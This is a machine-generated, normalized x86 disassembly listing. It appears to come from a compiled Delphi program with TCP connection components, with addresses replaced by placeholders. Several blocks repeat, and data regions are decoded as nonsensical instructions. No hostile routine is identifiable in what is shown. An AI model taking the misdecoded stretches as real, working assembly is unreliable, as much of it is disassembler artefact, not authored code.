lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e94
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_468bd7
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + 0x60004690 ] dh
inc esi
add [ eax - 0x37ffb99c ] bl
inc esi
add [ eax + edi * 2 ] dh
inc esi
add [ eax ] ch
lea eax [ esi ]
mov eax 0x9c00468e
add [ ebx ] 0x0
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov [ ebp - 0x15afffbf ] es
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
xor al 0x8c
inc esi
add [ edi ] al
adc dl [ ecx + ecx * 2 + 0x64 ]
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
inc esi
add [ eax ] ch
xchg ecx eax
inc esi
add [ eax + 0x12004691 ] ch
push esp
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
sbb al 0x91
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or [ ebp + 0x73 ] dl
dec esi
popad
insb
lea eax [ eax ]
cld
mov [ esi ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x8d
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e604
mov eax [ r-xdata ]
call sub_465f0c
test al al
je r-xdata
popad
nop
push ebx
mov ebx eax
mov eax ebx
call sub_4677fc
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
nop
inc esi
add ah ch
nop
inc esi
add [ ecx + edx * 4 ] bl
mov eax [ esi ]
shl [ edi + 0x46 ] 0x1
add [ 0x64491100 ] al
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_465564
mov edi eax
jmp r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
lea eax [ esi ]
dec eax
add [ eax ] al
add ah ch
inc ecx
add [ ebx + esi - 0x1cdbffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edx - 0x1c27ffbf ] bh
inc ecx
add [ ebx + edx * 4 ] ah
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x68 ] si
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 4 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
or [ ebx + 0x6f ] edx
add [ esi ] sub_469290
sub [ edx + 0x10046 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
add [ eax ] dl
inc eax
add [ eax + eax ] ch
[ eax + eax ]
add [ ecx + eax * 4 ] cl
inc esi
add [ eax + 0x28004692 ] dl
xchg edx eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53090003 ] al
outsd
mov eax esi
call sub_465864
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_465864
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e62c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_41e634
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404200
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465ec8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e94
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_468d44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_468eaa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e1ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_468e8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e604
mov eax [ r-xdata ]
call sub_465f0c
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_465564
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_465864
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_465864
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e62c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_41e634
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404200
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465ec8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e94
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_468eb8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_469089
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_469290
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_403fd8
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_469290
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_403fd8
mov eax [ ebp - 0x4 ]
call sub_469290
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_463c08
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_466da0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4663a4
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_467800
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_466a24
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_403f94
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_466c80
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_4640b4
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4663a4
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_466b44
mov eax [ r-xdata ]
call sub_465f0c
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463abc
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_468d44
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_468d44
pop ecx
mov eax [ ebp - 0x4 ]
call sub_469290
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_468ab0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469090
lea eax [ ebp - 0x1c ]
call sub_403f40
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
sub_4690b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466280
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4690ec
push ebx
mov ebx eax
mov eax ebx
call sub_467838
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_467088
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_466e58
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_469128
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469198
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_466afc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46919f
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_4691a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469218
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_466b20
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46921f
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_469228
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_469290
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_41e7a8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_469290
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40d3ac
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_469290
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_468260
mov [ ebx + 0x70 ] eax
sub_4692b8
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_467808
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
lea eax [ esi + 0x70 ]
call sub_40d3ac
sub_4692fc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41e9f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_469324
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403738#9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463ac8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e62c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46938c
mov eax [ ebp - 0x4 ]
add eax 0x44
mov edx [ ebx + 0x4 ]
call sub_403f94
call sub_403974
mov eax [ ebp - 0x4 ]
call sub_41e62c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4693b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4693d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4693dc
retn
sub_46954f
add [ eax + 0x380046a3 ] bl
jmp r-xdata
movsb [ edi ] [ esi ]
pushfd
inc esi
add [ ecx + ebp * 4 - 0x6303ffba ] bh
inc esi
add [ ebp + ebx * 4 - 0x62dbffba ] al
inc esi
add al ch
popfd
inc esi
add [ eax - 0x5c8bffba ] dl
inc esi
add [ eax ] bh
movsb [ edi ] [ esi ]
inc esi
add ah dl
cmpsd [ esi ] [ edi ]
inc esi
add [ eax + ebp * 4 ] dh
inc esi
add [ esi + 0x46 ] ch
add [ eax ] dl
push esp
dec ecx
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
loopne r-xdata
add [ eax - 0x37ffb99c ] bl
inc esi
add ah bl
pushfd
inc esi
add [ eax - 0x5d ] ah
inc esi
add [ eax + 0x60004699 ] bh
0xaa800046 0x46
push eax
lodsb [ esi ]
inc esi
add [ ebx + ebx * 4 ] dh
inc esi
add [ esp + ebx * 4 - 0x5643ffba ] ah
inc esi
add ah bh
pushfd
inc esi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
xchg ebp eax
inc esi
add [ eax ] dh
bound eax [ esi ]
str [ edi ]
dec ecx
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x0
add [ eax ] dl
inc eax
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x53 ]
inc ebx
dec ecx
dec ecx
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x46740072
add [ eax ] bh
add bh bh
int3
sub_469557
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ ebx + ebx * 4 + 0x46 ] bl
add [ eax + 0x64 ] ah
inc esi
add [ eax - 0x37ffb99c ] bl
inc esi
add ah bl
pushfd
inc esi
add [ eax - 0x5d ] ah
inc esi
add [ eax + 0x60004699 ] bh
0xaa800046 0x46
push eax
lodsb [ esi ]
inc esi
add [ ebx + ebx * 4 ] dh
inc esi
add [ esp + ebx * 4 - 0x5643ffba ] ah
inc esi
add ah bh
pushfd
inc esi
add [ ebp + ebx * 4 - 0x62dbffba ] al
inc esi
add al ch
popfd
inc esi
add [ eax - 0x5c8bffba ] dl
inc esi
add [ eax ] bh
movsb [ edi ] [ esi ]
inc esi
add ah dl
cmpsd [ esi ] [ edi ]
inc esi
add [ eax + ebp * 4 ] dh
inc esi
add [ esi + 0x46 ] ch
add [ eax ] dl
push esp
dec ecx
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
loopne r-xdata
inc esi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
xchg ebp eax
inc esi
add [ eax ] dh
bound eax [ esi ]
str [ edi ]
dec ecx
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x0
add [ eax ] dl
inc eax
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x53 ]
inc ebx
dec ecx
dec ecx
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x46740072
add [ eax ] bh
add bh bh
int3
sub_469a60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_469b24
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
cmp [ edi + 0x69 ] 0x0
jne r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
cmp [ edi + 0x7c ] 0x0
jne r-xdata
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469b2b
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov eax [ edi + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
mov dl 0x4
mov eax edi
call sub_466398
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
xor al 0x1
sete al
or al [ ebp - 0x1 ]
je r-xdata
cmp eax 0x0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_469b34
push ebx
push esi
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov edx [ ebx + 0x7c ]
test edx edx
setne al
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_469b5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466280
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0x6c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0x80 ] eax
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_46aa90
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa0 ] 0x8000
mov [ esi + 0xa8 ] 0x8000
push esi
push r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_46af24
mov [ esi + 0x74 ] eax
mov [ esi + 0x88 ] 0x4000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_469c00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f40
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov edi [ ebx + 0x74 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x20 ]
pop edi
pop esi
pop ebx
retn
push 0x1
or ecx 0xffffffff
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x6c ]
sub_469c40
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ esi + 0x70 ] 0x0
je r-xdata
lea eax [ esi + 0x74 ]
call sub_40d3ac
lea eax [ esi + 0xa4 ]
call sub_40d3ac
lea eax [ esi + 0x80 ]
call sub_40d3ac
lea eax [ esi + 0x6c ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_466318
test bl bl
jle r-xdata
lea eax [ esi + 0x7c ]
call sub_40d3ac
mov [ esi + 0x70 ] 0x0
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_469ca4
push ebx
mov ebx eax
mov dl 0x3
mov eax ebx
call sub_466398
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov dl 0x4
mov eax ebx
call sub_466398
pop ebx
retn
lea eax [ ebx + 0x7c ]
call sub_40d3ac
mov [ ebx + 0x70 ] 0x0
sub_469cfc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_46ac9c
push edi
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
sub_469d24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469d75
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_40b9cc
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d7c
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_469d84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_469dda
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov esi [ ebx + 0x80 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_462328
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469de1
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_469de8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_46a080
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0xfffffffe
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a087
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0xa4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0xc ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor esi esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
sete al
mov [ ebx + 0x69 ] al
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ ebx + 0xa0 ]
cdq
push edx
push eax
mov eax ecx
call sub_41a444
mov esi [ ebx + 0xa4 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x54 ]
mov esi eax
jmp r-xdata
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0x1
